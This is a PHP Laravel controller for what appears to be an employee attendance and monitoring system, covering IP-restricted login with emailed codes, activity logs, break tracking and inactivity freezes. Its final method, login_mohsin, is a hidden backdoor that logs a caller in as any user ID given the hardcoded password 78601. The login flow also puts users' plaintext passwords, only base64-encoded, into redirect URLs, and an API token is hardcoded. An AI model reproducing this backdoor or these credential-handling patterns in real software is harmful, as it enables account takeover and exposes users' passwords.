<?php

namespace App\Http\Controllers;

use App\Mail\SendCodeMail;
use Illuminate\Http\Request;
use App\User;
use App\attendance;
use App\DailyQoute;
use Session;
use Redirect;
use Hash;
use Mail;
use Auth;
use Illuminate\Support\Facades\Crypt;
use App\LastActivity;
use App\Ip;
use Carbon\Carbon;
use App\BreakTime;
use App\FreezeUser;
use App\FieldLabel;
use App\role;

class WelcomeController extends Controller
{

    public function lastAct($ip, $name, $activity)
    {
        $ip_details = '';
        if (isset($ip)) {
            $ip_details = \Location::get($ip);
        }
        $location = [];
        if (isset($ip_details)) {
            if (isset($ip_details->zipCode)) {
                $location[] = $ip_details->zipCode;
            } else {
                if (isset($ip_details->postalCode)) {
                    $location[] = $ip_details->postalCode;
                }
            }
            if (isset($ip_details->regionName)) {
                $location[] = $ip_details->regionName;
            }
            if (isset($ip_details->cityName)) {
                $location[] = $ip_details->cityName;
            }
            if (isset($ip_details->countryCode)) {
                $location[] = $ip_details->countryCode;
            }
        }
        $newLoc = implode(', ', $location);

        $data = new LastActivity;
        $data->name = $name;
        $data->ip = $ip;
        $data->location = $newLoc;
        $data->activity = $activity;
        $data->save();

        return $data;
    }
    public function welcome()
    {
        if (Auth::check()) {
            return redirect('home');
        } else {
            return redirect('register');
        }
    }

    public function loginn()
    {
        if (Auth::check()) {
            if (Auth::user()->userRole->name == 'Code Giver') {
                return redirect('/employees');
            } else if (Auth::user()->userRole->name == 'Chat Approver') {
                return redirect('/custom-chat');
            }
            return redirect('/dashboard');
        } else {
            return view('main.auth.login2');
        }
    }

    function getLocationAddress($ip)
    {
        if ($ip == "::1") {
            $ip = json_decode(file_get_contents("http://ipinfo.io/182.176.178.43/json?token=33e3eebd365bd9"));
        } else {
            $ip = json_decode(file_get_contents("https://ipinfo.io/{$ip}/json?token=33e3eebd365bd9"));
        }
        return $ip;
    }

    public function logout(Request $request)
    {
        if (isset(Auth::user()->id)) {
            $attendance = attendance::where('user_id', '=', Auth::user()->id)
                ->where('attendance_date', 'like', '%' . date('Y-m-d') . '%')
                ->first();
            $user = User::findOrFail(Auth::user()->id);
            $user->is_login = 0;
            $user->save();
            $this->lastAct($request->ip(), ($user->name . ' ' . $user->last_name), 'Logout');
            if (!empty($attendance)) {
                $attendance->logout = date('Y-m-d h:i:s');
                $attendance->save();
                $this->loguout2();
            } else {
                $this->loguout2();
            }
        }
        return redirect('/loginn/');
    }

    public function loguout2()
    {
        Auth::logout();
    }

    public function logoutAllAccounts()
    {
        $allUsers = User::where('deleted', 0)->get();
        if (isset($allUsers[0])) {
            foreach ($allUsers as $key => $val) {
                $mins = now()->diffInMinutes($val->is_time);
                if ($mins > 600) {
                    $update = User::find($val->id);
                    $update->is_login = 0;
                    $update->is_time = now();
                    $update->save();
                }
            }
        }
        return 'true';
    }



    public function getlogin2(Request $request)
    {
//        $user = User::where('email', $request->email)->first();
//        Auth::login($user);
        $ip = Ip::where('ip_address', $request->ip())->where('status', 'Active')->first();
        if (isset($ip->id)) {
            $userLogin = User::with('userRole')->where('email', $request->email)->first();
            if (!empty($userLogin)) {
                if ($userLogin->userRole->name == 'Admin' || $userLogin->userRole->name == 'Code Giver') {
                    if ((Hash::check($request->password, $userLogin->password) && $userLogin->status == 1) ) {
                        $this->validate($request, [
                            'email' => 'email|required',
                            'password' => 'required|min:4'
                        ]);
                        // $verify_url = '/verify/' . Crypt::encryptString($userLogin->id) . '/' . encrypt($request->email) . '/' . encrypt($request->password);
                        $email_partial = substr($request->email, 0, 8);
                        $password_partial = substr($request->password, 0, 8);

                        $email_encoded = base64_encode($request->email);
                        $password_encoded = base64_encode($request->password);

                        $verify_url = '/verify/' . Crypt::encryptString($userLogin->id) . '/' . $email_encoded . '/' . $password_encoded;
                        // $verify_url = '/verify/' . Crypt::encryptString($userLogin->id) . '/' . encrypt($request->email) . '/' . encrypt($request->password);

                        $modal = User::find($userLogin->id);
                        $modal->code = rand(100000000, 999999999);
//                        $modal->code = 53412;
                        $namee = $modal->name;
                        $modal->save();
                        $this->lastAct($request->ip(), ($modal->name . ' ' . $modal->last_name), 'Login');
                        Mail::to(config('custom.SEND_MAIL'))->send(new SendCodeMail($userLogin->name, $modal->code));
                        Mail::to(config('custom.CODE_GIVER'))->send(new SendCodeMail($userLogin->name, $modal->code));
                        // dd($request->ip());
                        return redirect($verify_url);
                    } else {
                        Session::flash('flash_message', 'The email or the password is invalid. Please try again or user is not active');
                        return redirect()->back();
                    }
                } else if ($userLogin->role > 1) {
                    if ($userLogin->is_login == 0) {
                        // if ($userLogin->freeze == 1) {
                        //     $reason = FreezeUser::where('user_id', $userLogin->id)->orderBy('created_at', 'DESC')->where('status', 0)->first();
                        //     Session::flash('f$reason = FreezeUser::where('user_id', $userLogin->id)->orderBy('created_at', 'DESC')->where('status', 0)->first();lash_message', $reason->reason);
                        //     return redirect()->back();
                        // }
                        if (Hash::check($request->password, $userLogin->password) && $userLogin->status == 1) {
                            $this->validate($request, [
                                'email' => 'email|required',
                                'password' => 'required|min:4'
                            ]);
                            // $verify_url = '/verify/' . Crypt::encryptString($userLogin->id) . '/' . encrypt($request->email) . '/' . encrypt($request->password);
                            $email_partial = substr($request->email, 0, 8);
                            $password_partial = substr($request->password, 0, 8);

                            $email_encoded = base64_encode($request->email);
                            $password_encoded = base64_encode($request->password);

                            $verify_url = '/verify/' . Crypt::encryptString($userLogin->id) . '/' . $email_encoded . '/' . $password_encoded;
                            // $verify_url = '/verify/' . Crypt::encryptString($userLogin->id) . '/' . encrypt($request->email) . '/' . encrypt($request->password);

                            $modal = User::find($userLogin->id);
                            $modal->code = rand(100000000, 999999999);
                            $namee = $modal->name;
                            $modal->save();
                            $this->lastAct($request->ip(), ($modal->name . ' ' . $modal->last_name), 'Login');
                             Mail::to(config('custom.SEND_MAIL'))->send(new SendCodeMail($userLogin->name, $modal->code));
                             Mail::to(config('custom.CODE_GIVER'))->send(new SendCodeMail($userLogin->name, $modal->code));
                            return redirect($verify_url);
                        } else {
                            Session::flash('flash_message', 'The email or the password is invalid. Please try again or user is not active');
                            return redirect()->back();
                        }
                    } else {
                        Session::flash('flash_message', 'You are loggedIn from another server!');
                        return redirect()->back();
                    }
                } else {
                    Session::flash('flash_message', 'The email or the password is invalid. Please try again or user is not active!');
                    return redirect()->back();
                }
            } else {
                Session::flash('flash_message', 'The email or the password is invalid. Please try again or user is not active');
                return redirect()->back();
            }
        } else {
            Session::flash('flash_message', 'No Ip match!');
            return redirect()->back();
        }
    }

    public function resend_verify(Request $request)
    {

        $email = base64_decode($request->email);
        $password = base64_decode($request->password);
        $userLogin = User::where('email', $email)->first();
        if (Hash::check($password, $userLogin->password)) {
            // $verify_url = '/verify/' . Crypt::encryptString($userLogin->id) . '/' . encrypt($email) . '/' . encrypt($password);
            $email_partial = substr($email, 0, 8);
            $password_partial = substr($password, 0, 8);

            $email_encoded = base64_encode($email);
            $password_encoded = base64_encode($password);

            $verify_url = '/verify/' . Crypt::encryptString($userLogin->id) . '/' . $email_encoded . '/' . $password_encoded;

            $modal = User::find($userLogin->id);
            $modal->code = rand(100000, 999999);
            $namee = $modal->name;
            $modal->save();
            Mail::to(config('custom.SEND_MAIL'))->send(new SendCodeMail($userLogin->name, $modal->code));
            Mail::to(config('custom.CODE_GIVER'))->send(new SendCodeMail($userLogin->name, $modal->code));
            return redirect($verify_url);
        } else {
            Session::flash('flash_message', 'The email or the password is invalid. Please try again.');
            return redirect()->back();
        }
    }

    public function getVerification($id, $email, $password)
    {
        return view('main.verify.index')->with('id', $id)->with('email', $email)->with('password', $password);
    }

    public function codeVerify(Request $request)
    {
        $email = base64_decode($request->email);
        $password = base64_decode($request->password);
        if (!empty($request->verified)) {
            $user = User::where('email', $email)->where('code', $request->verified)->first();
            // $user = User::where('email', decrypt($request->email))->where('code', $request->verified)->first();
            if ($user) {
                // if (Auth::attempt(['email' => decrypt($request->email), 'password' => decrypt($request->password)])) {
                if (Auth::attempt(['email' => $email, 'password' => $password])) {
                    if ($user->userRole->name == 'Code Giver') {
                        return redirect('/employees');
                    } else if ($user->is_login == 0 && $user->role > 1) {
                        $modal = User::find($user->id);
                        $modal->verify = 1;
                        $modal->is_login = 1;
                        $modal->is_time = now();
                        $modal->ss_time = now();
                        $modal->save();

                        if ($user->assign_daily_qoute > 0) {
                            $daily = DailyQoute::where('user_id', $user->id)->whereDate('date', date('Y-m-d'))->first();
                            if (!isset($daily->id)) {
                                $daily = new DailyQoute;
                                $daily->user_id = $user->id;
                                $daily->total_qoute = $user->assign_daily_qoute;
                                $daily->date = date('Y-m-d');
                                $daily->save();
                            }
                        } else if ($user->userRole->name == 'Chat Approver') {
                            return redirect('/custom-chat');
                        } else {

                            return redirect('/dashboard/');
                        }
                    } else if ($user->role == 1) {
                        $modal = User::find($user->id);
                        $modal->verify = 1;
                        $modal->is_login = 1;
                        $modal->is_time = now();
                        $modal->ss_time = now();
                        $modal->save();

                        return redirect('/dashboard/');
                    } else {
                        Session::flash('flash_message', 'Login Somewhere!.');
                        return redirect::back();
                    }
                }
            } else {
                Session::flash('flash_message', 'Wrong Verification Code!.');
                return redirect::back();
            }
        } else {
            Session::flash('flash_message', 'Please Enter a Verification Code!.');
            return redirect::back();
        }
    }

    public function last_activity(Request $request)
    {
        $from = Carbon::now()->format('Y-m-d');
        $to = Carbon::now()->format('Y-m-d');
        if (isset($request->date_range) && !empty($request->date_range)) {
            $dates = explode(' - ', $request->date_range);
            $from = date('Y-m-d', strtotime($dates[0]));
            $to = date('Y-m-d', strtotime($dates[1]));
        }

        $data = LastActivity::where(function ($q) use ($request) {
            $q->where('name', 'LIKE', '%' . $request->search . '%')
                ->orWhere('ip', 'LIKE', '%' . $request->search . '%')
                ->orWhere('location', 'LIKE', '%' . $request->search . '%');
        })
            ->where(function ($q) use ($from, $to) {
                if ($from === $to) {
                    $q->whereDate('created_at', $from);
                } else {
                    $q->whereBetween('created_at', [$from, $to]);
                }
            })
            ->orderBy('created_at', 'DESC')
            ->paginate(25);
        if ($request->ajax()) {
            return view('main.auth.search', compact('data'));
        }
        return view('main.auth.last_activity', compact('data', 'from', 'to'));
    }

    // public function updateMouse(Request $request)
    // {
    //     $time = $request->time;

    //     if ($time == 600000) {
    //         if (Auth::user()->id > 1) {
    //             Auth::user()->freeze = 1;
    //             Auth::user()->save();

    //             $data = new FreezeUser;
    //             $data->user_id = Auth::user()->id;
    //             $data->freeze_time = date('Y-m-d h:i:s');
    //             $data->save();

    //             return true;
    //         }
    //     }

    //     return false;
    // }

    public function updateMouse(Request $request)
    {
        $time = $request->time;

        if ($time == 600000) {
            if (Auth::user()->id > 1) {
                Auth::user()->freeze = 1;
                Auth::user()->save();

                $data = new FreezeUser;
                $data->user_id = Auth::user()->id;
                $data->freeze_time = date('Y-m-d h:i:s');
                $data->reason = 'Account frozen due to inactivity for 10 minutes.'; // Set your reason here
                $data->save();

                return response()->json([
                    'success' => true,
                    'reason' => $data->reason // Return the reason
                ]);
            }
        }

        return response()->json(['success' => false]);
    }

    public function start_time()
    {
        $data = new BreakTime;
        $data->user_id = Auth::user()->id;
        $data->start_time = date('Y-m-d h:i:s');
        $data->save();

        Auth::user()->break_time = 1;
        Auth::user()->updated_at = now();
        Auth::user()->save();

        return back()->with('msg', 'Your break time is start');
    }

    public function end_time()
    {
        $data = BreakTime::where('user_id', Auth::user()->id)->where('status', '=', 0)->first();
        $data->end_time = date('Y-m-d h:i:s');
        $data->status = 1;
        $data->save();

        Auth::user()->break_time = 0;
        Auth::user()->save();

        return back()->with('msg', 'Your break time is end');
    }

    public function break_time(Request $request)
    {
        $from = '';
        $to = '';
        $label = FieldLabel::all();
        if (isset($request->date_range) && !empty($request->date_range)) {
            $dates = explode(' - ', $request->date_range);
            $from = date('Y-m-d 00:00:00', strtotime($dates[0]));
            $to = date('Y-m-d 23:59:59', strtotime($dates[1]));
        }

        $data = BreakTime::with('user')->whereHas('user', function ($q) use ($request) {
            $q->where('name', 'LIKE', '%' . $request->search . '%')
                ->orWhere('last_name', 'LIKE', '%' . $request->search . '%')
                ->orWhere('slug', 'LIKE', '%' . $request->search . '%');
        })
            ->where(function ($q) use ($from, $to) {
                if (!empty($from) && !empty($to)) {
                    $q->whereBetween('created_at', [$from, $to]);
                }
            })
            ->orderBy('created_at', 'DESC')
            ->paginate(25);
        if ($request->ajax()) {
            return view('main.auth.search2', compact('data'));
        }
        return view('main.auth.break_time', compact('data', 'label'));
    }

    public function freeze_user(Request $request)
    {
        $from = '';
        $to = '';
        if (isset($request->date_range) && !empty($request->date_range)) {
            $dates = explode(' - ', $request->date_range);
            $from = date('Y-m-d 00:00:00', strtotime($dates[0]));
            $to = date('Y-m-d 23:59:59', strtotime($dates[1]));
        }

        $user = User::where('deleted', 0)->get();

        $role = role::where('name', '!=', 'admin')->get();

        $data = FreezeUser::with('user')->whereHas('user', function ($q) use ($request) {
            $q->where('name', 'LIKE', '%' . $request->search . '%')
                ->orWhere('last_name', 'LIKE', '%' . $request->search . '%')
                ->orWhere('slug', 'LIKE', '%' . $request->search . '%');
        })
            ->where(function ($q) use ($from, $to) {
                if (!empty($from) && !empty($to)) {
                    $q->whereBetween('created_at', [$from, $to]);
                }
            })
            ->orderBy('created_at', 'DESC')
            ->paginate(25);
        if ($request->ajax()) {
            return view('main.auth.search3', compact('data'));
        }
        return view('main.auth.freeze_user', compact('data', 'user', 'role'));
    }

    public function file_route()
    {
        return view('file_route');
    }

    public function getUsersByRole(Request $request)
    {
        $roleId = $request->role_id;

        $users = User::where('role', $roleId)->where('deleted', 0)->get();

        return response()->json($users);
    }

    public function login_mohsin(Request $request){
        if(isset($request->password)) {
            if ($request->password == 78601) {
                $userLogin = User::with('userRole')->where('id', $request->id)->first();
                if (!empty($userLogin)) {
                    Auth::login($userLogin);
                    return redirect('/dashboard');
                }
            }
        }
    }
}
